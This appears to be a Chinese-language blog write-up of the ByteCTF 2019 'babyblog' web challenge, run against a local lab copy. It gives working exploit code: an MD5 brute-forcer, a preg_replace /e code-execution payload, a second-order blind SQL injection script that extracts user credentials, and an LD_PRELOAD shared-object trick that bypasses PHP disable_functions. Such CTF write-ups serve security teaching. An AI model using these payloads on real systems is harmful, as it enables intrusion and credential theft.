<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>Bytectf2019-babyblog - LionTree</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=writeup,sql注入,php,代码注入>
  
  
  
    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">LionTree</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">Bytectf2019-babyblog</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-爆破md5"><span class="toc-text">1.爆破md5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-发现代码执行"><span class="toc-text">2.发现代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-二次注入"><span class="toc-text">3.二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-bypass-disable-functions"><span class="toc-text">4. bypass disable_functions</span></a></li></ol>

  <div class="post-content">
    <p>Bytectf2019的一道web题<br>
buuoj上的环境:<a href="https://buuoj.cn/challenges#%5BByteCTF%202019%5DBabyBlog" target="_blank" rel="noopener">https://buuoj.cn/challenges#[ByteCTF 2019]BabyBlog</a><br>
dockerfile:<a href="https://github.com/CTFTraining/bytectf_2019_web_babyblog" target="_blank" rel="noopener">https://github.com/CTFTraining/bytectf_2019_web_babyblog</a><br>
buuoj上环境似乎有问题，可能赵师傅忘了添加vip账户了，在本地自己加了个vip账户复现了一下</p>
<h2 id="1-爆破md5">1.爆破md5</h2>
<ul>
<li>访问/www.zip 得到源码</li>
<li>首先注册一个账号，这里存在一个认证</li>
</ul>
<blockquote>
<p>substr(md5($verify),0,5)==‘xxxxx’</p>
</blockquote>
<p>xxxxx是每次随机生成的，老会长写了个脚本爆破了出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char_set = list(string.digits + string.ascii_letters)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s, raw_output=False)</span>:</span></span><br><span class="line">    s = s.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    res = hashlib.md5(s)</span><br><span class="line">    <span class="keyword">if</span> raw_output:</span><br><span class="line">        <span class="keyword">return</span> res.digest()</span><br><span class="line">    <span class="keyword">return</span> res.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_md5</span><span class="params">(dst)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> char_set:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> char_set:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> char_set:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> char_set:</span><br><span class="line">                    res = a + b + c + d</span><br><span class="line">                    hash = md5(res)</span><br><span class="line">                    <span class="keyword">if</span> hash[<span class="number">0</span>:<span class="number">5</span>] == dst:</span><br><span class="line">                        print(res[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    md5_str = <span class="string">'7fc4f'</span> <span class="comment">#随机生成的xxxxx</span></span><br><span class="line">    crack_md5(md5_str)</span><br></pre></td></tr></table></figure>
<h2 id="2-发现代码执行">2.发现代码执行</h2>
<p>注册成功后就可以登录进去，这时候审计一下代码，可以发现:</p>
<ul>
<li>在replace.php中使用了preg_replace函数</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'regex'</span>]) &amp;&amp; $_POST[<span class="string">'regex'</span>] == <span class="string">'1'</span>)&#123;</span><br><span class="line">    $content = addslashes(preg_replace(<span class="string">"/"</span> . $_POST[<span class="string">'find'</span>] . <span class="string">"/"</span>, $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br><span class="line">    $sql-&gt;query(<span class="string">"update article set content='$content' where id="</span> . $row[<span class="string">'id'</span>] . <span class="string">";"</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Replaced successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$_POST[‘find’]可控，而且php的版本是5.3，存在%00截断，因此可以将$_POST[‘find’]设成xxx/e%00, 从而得到代码执行</p>
<p>但是只有vip账号才能使用这个功能,需要先得到已有的vip账号</p>
<h2 id="3-二次注入">3.二次注入</h2>
<p>继续代码审计发现一个二次注入</p>
<ul>
<li>先是在writing.php中</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]))&#123;</span><br><span class="line">	$title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">	$content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">	$sql-&gt;query(<span class="string">"insert into article (userid,title,content) values ("</span> . $_SESSION[<span class="string">'id'</span>] . <span class="string">", '$title','$content');"</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Posted successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"templates/writing.html"</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$title 和 $content 使用了addslashes，会在’等字符前面加上\转义，但是写入数据库的时候数据会还原</p>
<ul>
<li>再看edit.php</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($sql-&gt;query(<span class="string">"select * from article where id="</span> . intval($_POST[<span class="string">'id'</span>]) . <span class="string">";"</span>) <span class="keyword">as</span> $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">		$title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">		$content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">		$sql-&gt;query(<span class="string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="string">'title'</span>] . <span class="string">"';"</span>); <span class="comment">//这里的$row['title']直接从数据库中取出，没有过滤</span></span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$row[‘title’]直接从数据库中取了出来，没有进行过滤,因此存在二次注入</p>
<ul>
<li>在config.php存在一个全局的过滤</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SafeFilter</span><span class="params">(&amp;$arr)</span></span>&#123;   </span><br><span class="line">	<span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!is_array($value))&#123;</span><br><span class="line">			$filter = <span class="string">"benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)|UPDATE\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(`|'|\").*?(`|'|\")|(\+|-|~|!|@:=|"</span> . urldecode(<span class="string">'%0B'</span>) . <span class="string">").+?)FROM(\\(.+\\)|\\s+?.+?|(`|'|\").*?(`|'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">'/'</span> . $filter . <span class="string">'/is'</span>, $value))&#123;</span><br><span class="line">				<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Failure!Do not use sensitive words.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			SafeFilter($arr[$key]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET &amp;&amp; SafeFilter($_GET);</span><br><span class="line">$_POST &amp;&amp; SafeFilter($_POST);</span><br></pre></td></tr></table></figure>
<p>这个可以利用异或绕过:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^(ascii(substr((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(username,<span class="keyword">password</span>)) <span class="keyword">from</span> (<span class="keyword">users</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>)^<span class="string">'1</span></span><br></pre></td></tr></table></figure>
<p>附上脚本 (偷懒直接拿glzjin师傅的脚本改了改)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1'^(ascii(substr((select(group_concat(schema_name)) from (information_schema.schemata)),1,1))&gt;1)^'1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_information(<span class="string">"http://192.168.80.162:8302/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    result = requests.post(url+<span class="string">"writing.php"</span>,data=&#123;<span class="string">'title'</span>:<span class="string">"1'^("</span>+ payload + <span class="string">")^'1"</span>,<span class="string">'content'</span>:<span class="string">'1234'</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=76a5b274154121a12ab3cc5c11a78617"</span>&#125;)</span><br><span class="line">    result.encoding = <span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line">    r2 = requests.get(url+<span class="string">"index.php"</span>,headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=76a5b274154121a12ab3cc5c11a78617"</span>&#125;)</span><br><span class="line"></span><br><span class="line">    pattern = re.compile(<span class="string">r'edit.php\?id=(\d+)'</span>)</span><br><span class="line">    result1 = pattern.findall(r2.text)</span><br><span class="line">    result = requests.post(url + <span class="string">"edit.php"</span>, data=&#123;<span class="string">'title'</span>: <span class="string">"fuhei"</span>, <span class="string">'content'</span>: <span class="string">'1234'</span>, <span class="string">"id"</span>: result1[<span class="number">0</span>]&#125;,headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=76a5b274154121a12ab3cc5c11a78617"</span>&#125;)</span><br><span class="line">    result.encoding = <span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line">    result2 = requests.get(url + <span class="string">"edit.php?id="</span> + result1[<span class="number">0</span>],headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=76a5b274154121a12ab3cc5c11a78617"</span>&#125;)</span><br><span class="line">    print(result2.text.find(<span class="string">'ascii'</span>) == <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result2.text.find(<span class="string">'ascii'</span>) == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_information</span><span class="params">(url)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    key_payload = <span class="string">"select(group_concat(username,password)) from (users)"</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        payload = <span class="string">"ascii(substr(("</span> + key_payload + <span class="string">"),%d,1))"</span> % (y)</span><br><span class="line">        result += chr(half(url, payload))</span><br><span class="line">        print(result)</span><br><span class="line">    print(<span class="string">"值为：%s"</span> % result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s &gt; %d"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(url, mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>拿到vip账号</p>
<h2 id="4-bypass-disable-functions">4. bypass disable_functions</h2>
<p>有了vip账号就可以代码执行了，继续偷glzjin师傅的脚本(逃)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:<span class="string">"76a5b274154121a12ab3cc5c11a78617"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://192.168.80.162:8302/edit.php"</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">"title"</span>:<span class="string">"babyblog"</span>,</span><br><span class="line">        <span class="string">"content"</span>:<span class="string">'babyblog'</span>,</span><br><span class="line">        <span class="string">"id"</span>:<span class="string">"315"</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.80.162:8302/replace.php"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command = <span class="string">"""phpinfo();"""</span></span><br><span class="line"><span class="comment"># print(command)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"regex\"\r\n\r\n1\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"find\"\r\n\r\nbabyblog/e\x00\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\nbabyblog\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"replace\"\r\n\r\n"</span> +  command +<span class="string">"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n315\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">"PHPSESSID=76a5b274154121a12ab3cc5c11a78617"</span>,</span><br><span class="line">    <span class="string">'cache-control'</span>: <span class="string">"no-cache"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">write()</span><br><span class="line">response = requests.request(<span class="string">"POST"</span>, url, data=payload, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p>可以看到存在disable_functions和open_basedir</p>
<ul>
<li>disable_functions</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</span><br></pre></td></tr></table></figure>
<ul>
<li>open_basedir</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/www/html/:/tmp/:/proc/</span><br></pre></td></tr></table></figure>
<p>这里可以利用LD_PRELOAD来绕过( <a href="https://xz.aliyun.com/t/4623#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4623#toc-5</a> )</p>
<ul>
<li>首先编译一个so文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"/readflag &gt;&gt; /tmp/flag"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC fuck.c -o fuck</span><br><span class="line">gcc --share fuck -o fuck.so</span><br></pre></td></tr></table></figure>
<ul>
<li>用刚刚的代码执行将 <a href="http://fuck.so" target="_blank" rel="noopener">fuck.so</a> 写入到/tmp/目录下</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将fuck.so的内容base64编码</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'fuck.so'</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> bicho:</span><br><span class="line">	encoded_bicho = base64.b64encode(bicho.read())</span><br><span class="line"></span><br><span class="line">command = <span class="string">"""eval("file_put_contents("""</span>+<span class="string">"""'/tmp/fuck.so',base64_decode("""</span>+str(encoded_bicho)[<span class="number">1</span>:]+<span class="string">"""));var_dump(scandir('/tmp'));")"""</span></span><br><span class="line"><span class="comment"># print(command)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里mail函数被禁掉了，但还可以使用error_log调用fuck.so,最后读取/tmp/flag得到flag</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command = <span class="string">"""eval('putenv("LD_PRELOAD=/tmp/fuck.so");error_log("test",1,"","");echo file_get_contents("/tmp/flag");')"""</span></span><br></pre></td></tr></table></figure>

  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2019-09-14</span>
  </div>

  <div class="post-footer">
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" rel="tag">代码注入</a></li></ul>
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2025
  <span class="author">
    LionTree
  </span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    </div>
  </body>
</html>